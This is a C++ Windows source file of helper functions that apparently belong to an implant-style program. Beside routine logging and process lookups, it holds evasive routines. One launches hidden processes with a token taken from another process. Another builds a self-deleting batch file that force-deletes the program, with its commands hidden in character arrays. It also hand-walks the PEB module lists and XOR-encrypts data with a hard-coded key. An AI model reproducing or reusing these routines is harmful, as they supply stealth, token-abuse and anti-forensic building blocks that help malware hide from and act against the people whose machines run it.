
#include "utils.h"
#include <windows.h>
#include <Shlobj.h>
#include <stdio.h>
#include <io.h>
#include <UserEnv.h>
#include <tlhelp32.h>
#include <WtsApi32.h>
#include "utils.h"
#include <Shlwapi.h>
#include <Psapi.h>

#include <iostream>
#include <string>
#include "FileHelper.h"
#include "json.h"
#include "resource.h"
#include "command.h"
#include "shell.h"
#include "strHelper.h"
#include "public.h"

#pragma comment(lib,"wtsapi32.lib")
#pragma comment(lib,"Userenv.lib")

using namespace std;










int __cdecl runLog(const WCHAR* format, ...)
{
	int result = 0;

	WCHAR showout[2048];

	va_list   arglist;

	va_start(arglist, format);

	int len = vswprintf_s(showout, sizeof(showout) / sizeof(WCHAR), format, arglist);

	va_end(arglist);

	OutputDebugStringW(showout);

	result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, (char*)showout, len * sizeof(WCHAR), FILE_WRITE_APPEND);

	return len;
}


int __cdecl runLog(const CHAR* format, ...)
{
	int result = 0;

	CHAR showout[2048];

	va_list   arglist;

	va_start(arglist, format);

	int len = vsprintf_s(showout, sizeof(showout), format, arglist);

	va_end(arglist);

	OutputDebugStringA(showout);

	result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, showout, len, FILE_WRITE_APPEND);

	return len;
}

int __cdecl opLog(const CHAR* format, ...)
{
	int result = 0;

	CHAR info[2048];

	SYSTEMTIME st;
	GetLocalTime(&st);
	int offset = wsprintfA(info, "[ljg]%2u:%2u:%2u %2u/%2u/%4u ", st.wHour, st.wMinute, st.wSecond, st.wMonth, st.wDay, st.wYear);

	va_list   arglist;

	va_start(arglist, format);

	offset += vsprintf_s(info + offset, sizeof(info)- offset, format, arglist);

	va_end(arglist);

	OutputDebugStringA(info);

	result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, info, offset, FILE_WRITE_APPEND);

	return offset;
}



unsigned short crc16(unsigned char* data, int size) {

	int cnt = size >> 1;
	int mod = size % 2;

	unsigned int v = 0;

	unsigned short* crcdata = (unsigned short*)data;

	for (int i = 0; i < cnt; i++)
	{
		v += crcdata[i];
	}

	if (mod)
	{
		v += data[cnt * 2];
	}

	unsigned int high16 = v >> 16;
	v = v & 0xffff;
	v += high16;
	return v;
}







int isTerminated() {
	char* file = 0;
	int filesize = 0;

	int ret = 0;

	MyJson json(JSON_CONFIG_FILENAME);

	int pos = 0;
	string v = json.getjsonValue(KEYNAME_DEAD_STATUS, JSON_TYPE_STRING, &pos);
	if (v == "")
	{
		return FALSE;
	}
	else {
		return TRUE;
	}
}


int cpuBits() {
	SYSTEM_INFO si;
	GetNativeSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		return 64;
	else
		return 32;
}


int getOsBits() {
	int wow = wow64();

	int cpubits = cpuBits();

	if (cpubits == 64 && wow == FALSE)
	{
		return 64;
	}else if (cpubits == 64 && wow )
	{
		return 32;
	}
	else if (cpubits == 32 && wow == FALSE) {
		return 32;
	}
	return 32;
}


int wow64()
{
	BOOL bIsWow64 = FALSE;
	//IsWow64Process is not available on all supported versions of Windows.
	//Use GetModuleHandle to get a handle to the DLL that contains the function and GetProcAddress to get a pointer to the function if available.

	char szIsWow64Process[] = { 'I','s','W','o','w','6','4','P','r','o','c','e','s','s',0 };

	HMODULE hker = (HMODULE)LoadLibraryA("kernel32.dll");
	if (hker == 0)
	{
		return FALSE;
	}

	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(hker, szIsWow64Process);
	if (NULL != fnIsWow64Process)
	{
		int iRet = fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
		if (iRet)
		{
			return bIsWow64;
		}
	}
	return 0;
}


HANDLE  bRunning(BOOL* exist)
{
	HANDLE h = CreateMutexA(NULL, TRUE, MY_MUTEX_NAME);
	DWORD dwRet = GetLastError();
	if (h)
	{
		if (ERROR_ALREADY_EXISTS == dwRet)
		{
			*exist = TRUE;
			return h;
		}
		else if (dwRet == FALSE)
		{
			*exist = FALSE;
			return h;
		}
		else
		{
			*exist = FALSE;
			return h;
		}
	}
	else {
		*exist = FALSE;
		return FALSE;
	}
}




int __stdcall delFileProc(wchar_t* filename) {
	do
	{
		Sleep(1000);
		int ret = DeleteFileW(filename);
		if (ret)
		{
			//runLog("delete file:%ws\r\n", filename);
			break;
		}

	} while (TRUE);

	return 0;
}


int restart(const char* newpath, const char* oldpath) {
	int ret = 0;

	if (lstrcmpiA(newpath, oldpath) != 0) {

		ret = copySelf((char*)newpath, oldpath);
		if (ret)
		{
			ReleaseMutex(g_mutex_handle);
			CloseHandle(g_mutex_handle);
			char szcmd[1024];
			wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newpath, oldpath);
			ret = WinExec(szcmd, SW_SHOW);
			ExitProcess(0);
		}
	}
	return 0;
}


int xor_crypt(char * data,int len) {
	//return len;

	const char * key = "fuck crackers who want to crack this program!";
	int keylen = lstrlenA(key);
	for (int i = 0,  j = 0; i < len; i++) {

		data[i] = data[i] ^ key[j];
		j++;
		if (j >= keylen) {
			j = 0;
		}
	}

// 	for (int i = 0, j = 0; i < len; i++) {
// 
// 		data[i] = data[i] ^ key[j];
// 		j++;
// 		if (j >= keylen) {
// 			j = 0;
// 		}
// 	}
	return len;
}



int copySelf(const char * dest,const char * cudir) {

	return 0;

	int ret = 0;

// 	ret = MoveFileExA(cudir, dest, MOVEFILE_DELAY_UNTIL_REBOOT| MOVEFILE_REPLACE_EXISTING);
// 	return ret;

	char cmd[1024];
	int len = wsprintfA(cmd, "copy \"%s\" \"%s\"", cudir, dest);
	ret = shell(cmd);
	return ret;
	

	char* file = 0;
	int filesize = 0;

	ret = FileHelper::fileReader(cudir, &file, &filesize);
	if (ret)
	{
		ret = FileHelper::fileWriter(dest, file, filesize,FILE_WRITE_NEW);

		delete[]file;
	}

	//ret = CopyFileA(cudir, dest, FALSE);

	return ret;
}



LPVOID getCertFile(int * size) {

	HMODULE h = GetModuleHandleA(0);
	HRSRC hRes = FindResourceA(h, (LPCSTR)RESOURCE_CERT, (LPCSTR)RT_RCDATA);
	if (hRes)
	{
		DWORD dwSize = SizeofResource(h, hRes);
		HGLOBAL hGb = LoadResource(h, hRes);
		if (hGb)
		{
			LPVOID pData = LockResource(hGb);
			if (pData)
			{
				*size = dwSize;
				return pData;
			}
		}
	}
	return 0;
}



int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR szparam)
{
	int ret = 0;
	HANDLE hToken = 0;

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	for (Process32First(hProcessSnap, &pe32); Process32Next(hProcessSnap, &pe32);)
	{
		char szParam[MAX_PATH] = { 0 };
		int iRet = WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, szParam, sizeof(szParam) - 1, NULL, NULL);
		if (lstrcmpiA(_strupr(szParam), _strupr(lpTokenProcessName)) == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
			if (hProcess)
			{
				ret = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
				CloseHandle(hProcess);
			}
			else {

			}
			break;
		}
	}

	CloseHandle(hProcessSnap);

	if (hToken == 0) {
		return 0;
	}

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	lstrcpyA(si.lpDesktop, "winsta0\\default");
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	LPVOID lpEnvBlock = NULL;
	BOOL bEnv = CreateEnvironmentBlock(&lpEnvBlock, hToken, FALSE);
	DWORD dwFlags = CREATE_NEW_CONSOLE;
	if (bEnv)
	{
		dwFlags |= CREATE_UNICODE_ENVIRONMENT;
	}

	//si.dwFlags |= dwFlags;
	// 环境变量创建失败仍然可以创建进程，但会影响到后面的进程获取环境变量内容
	ret = CreateProcessAsUserA(
		hToken,
		szProcessName,
		szparam,
		NULL,
		NULL,
		FALSE,
		dwFlags,
		bEnv ? lpEnvBlock : NULL,
		NULL,
		&si,
		&pi);

	if (bEnv)
	{
		ret = DestroyEnvironmentBlock(lpEnvBlock);
	}

	return ret;
}






DWORD getPidByName(const char* szProcessName)
{
	char szProcName[MAX_PATH] = { 0 };
	lstrcpyA(szProcName, szProcessName);
	_strupr_s(szProcName, MAX_PATH);

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = 0;
	BOOL bNext = Process32First(hProcessSnap, &pe32);
	while (bNext)
	{
		char szexefn[MAX_PATH] = { 0 };
		int ret = wcstombs(szexefn,pe32.szExeFile, lstrlenW(pe32.szExeFile));
		_strupr_s(szexefn, MAX_PATH);

		if (lstrcmpA(szProcName, szexefn) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
		bNext = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return FALSE;
}


DWORD getProcNameByPID(DWORD pid, char* procname, int buflen)
{
	HANDLE h = NULL;
	PROCESSENTRY32 pe = { 0 };
	DWORD ppid = 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(h, &pe))
	{
		do
		{
			if (pe.th32ProcessID == pid)
			{

				int len = WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, procname, buflen, 0, 0);
				if (len > 0)
				{
					procname[len] = 0;
					return len;
				}
				break;
			}
		} while (Process32Next(h, &pe));
	}
	CloseHandle(h);
	return (ppid);
}




/*
typedef struct _PEB_LDR_DATA
{
	ULONG         Length;                             // 00h
	BOOLEAN       Initialized;                        // 04h
	PVOID         SsHandle;                           // 08h
	LIST_ENTRY    InLoadOrderModuleList;              // 0ch
	LIST_ENTRY    InMemoryOrderModuleList;            // 14h
	LIST_ENTRY    InInitializationOrderModuleList;    // 1ch
	EntryInProgress  //Ptr32 Void
	ShutdownInProgress  //Uchar
	ShutdownThreadId //Ptr32 Void
}
PEB_LDR_DATA,* PPEB_LDR_DATA;							// 24h

typedef struct _LDR_DATA_TABLE_EBTRY{  // Start from Windows XP
	PVOID Reservedl[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	PVOID Reserved4[8];
	PVOID Reserved5[3];
	union {
			PVOID SectionPointer;
			ULONG CheckSum;
	}
	ULONG TimeDateStamp;
	}

*/

//InInitializationOrderModuleList
int initOrderModule()
{
	void* PEB = NULL,
		* Ldr = NULL,
		* Flink = NULL,
		* p = NULL,
		* BaseAddress = NULL,
		* FullDllName = NULL;

#ifndef _WIN64
	__asm
	{
		mov eax, fs: [0x30]
		mov PEB, eax
	}
#endif
	Ldr = *((void**)((unsigned char*)PEB + 0x0c));
	Flink = *((void**)((unsigned char*)Ldr + 0x1c));
	p = Flink;
	do
	{
		BaseAddress = *((void**)((unsigned char*)p + 0x08));
		FullDllName = *((void**)((unsigned char*)p + 0x18));

		p = *((void**)p);
	} while (Flink != p);
	return 0;
}

//InMemoryOrderModuleList
int memoryOrderModule()
{
	void* PEB = NULL,
		* Ldr = NULL,
		* Flink = NULL,
		* p = NULL,
		* BaseAddress = NULL,
		* FullDllName = NULL;
#ifndef _WIN64
	__asm
	{
		mov eax, fs: [0x30]
		mov PEB, eax
	}
#endif
	Ldr = *((void**)((unsigned char*)PEB + 0x0c));
	Flink = *((void**)((unsigned char*)Ldr + 0x14));
	p = Flink;
	do
	{
		BaseAddress = *((void**)((unsigned char*)p + 0x10));
		FullDllName = *((void**)((unsigned char*)p + 0x20));
		p = *((void**)p);
	} while (Flink != p);
	return 0;
}


//InLoadOrderModuleList列表的code
int loadOrderModule()
{
	void* PEB = NULL,
		* Ldr = NULL,
		* Flink = NULL,
		* p = NULL,
		* BaseAddress = NULL,
		* FullDllName = NULL;
#ifndef _WIN64
	__asm
	{
		mov eax, fs: [0x30]
		mov PEB, eax
	}
#endif
	Ldr = *((void**)((unsigned char*)PEB + 0x0c));
	Flink = *((void**)((unsigned char*)Ldr + 0x0c));
	p = Flink;
	do
	{
		BaseAddress = *((void**)((unsigned char*)p + 0x18));
		FullDllName = *((void**)((unsigned char*)p + 0x28));
		p = *((void**)p);
	} while (Flink != p);
	return 0;
}



int getModules() {

	DWORD pid = GetCurrentProcessId();

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{ 
		return 0; 
	}
	MODULEENTRY32 mi;
	mi.dwSize = sizeof(MODULEENTRY32);
	BOOL bRet = Module32First(hSnapshot, &mi);
	while (bRet)
	{
		char szmodule[MAX_PATH];
		wcstombs(szmodule, mi.szModule, sizeof(szmodule));
		if (lstrcmpiA("kernel32.dll", szmodule) == 0 || lstrcmpiA("ntdll.dll", szmodule) == 0 )
		{
			
		}
		else {
			if (strstr(szmodule,".exe"))
			{

			}
			else {
				MessageBoxA(0, szmodule, szmodule, MB_OK);
			}
		}

		bRet = Module32Next(hSnapshot, &mi);
	}
	return FALSE;
}



void KillSelfAndRun(const char* szFilename,const char* szCmd)
{

	char szBat[2048] = { 0 };
	GetTempPathA(2048, szBat);
	GetTempFileNameA(szBat, "iun", 0, szBat);

	DeleteFileA(szBat);
	char* lpDot = NULL;
	lpDot = strrchr(szBat, '.');
	*lpDot = 0;
	strcat(szBat, ".bat");

	HANDLE hFile = CreateFileA(
		szBat,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_RANDOM_ACCESS,
		NULL);

	opLog("szBat:%s", szBat);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	char szCommand[4096] = { 0 };
	char szRepeat[256] = { ':','R','e','p','e','a','t','\r','\n' ,0 };
	strcat(szCommand, szRepeat);
	char szATTRIB[256] = { 'A','T','T','R','I','B',' ','-','h',' ','-','s',' ',0 };
	strcat(szCommand, szATTRIB);
	strcat(szCommand, "\"");
	strcat(szCommand, szFilename);
	strcat(szCommand, "\"");
	char szdel[256] = { '\r','\n' ,'d','e','l',' ','/','f',' ' ,0 };
	strcat(szCommand, szdel);
	strcat(szCommand, "\"");
	strcat(szCommand, szFilename);
	strcat(szCommand, "\"");
	char szPing[256] = 
	{ '\r','\n' ,'P','i','n','g',' ','1','2','7','.','0','.','0','.','1',' ','-','n',' ','3','\r','\n','i','f',' ','e','x','i','s','t',' ',0 };
	strcat(szCommand, szPing);
	strcat(szCommand, "\"");
	strcat(szCommand, szFilename);
	strcat(szCommand, "\"");
	char szgoto[256] = { ' ','g','o','t','o',' ','R','e','p','e','a','t','\r','\n','c','m','d','.','e','x','e',' ','/','c',' ',0 };
	strcat(szCommand, szgoto);
	strcat(szCommand, szCmd);
	char szdelself[256] = { '\r','\n' ,'d','e','l',' ','%','%','0',' ','\r','\n',0 };
	strcat(szCommand, szdelself);
	opLog("szCommand : %s", szCommand);

	DWORD NumberOfBytesWritten = 0;
	WriteFile(hFile, szCommand, strlen(szCommand), &NumberOfBytesWritten, 0);
	CloseHandle(hFile);
	ShellExecuteA(0, "open", szBat, 0, 0, 0);
	return;
}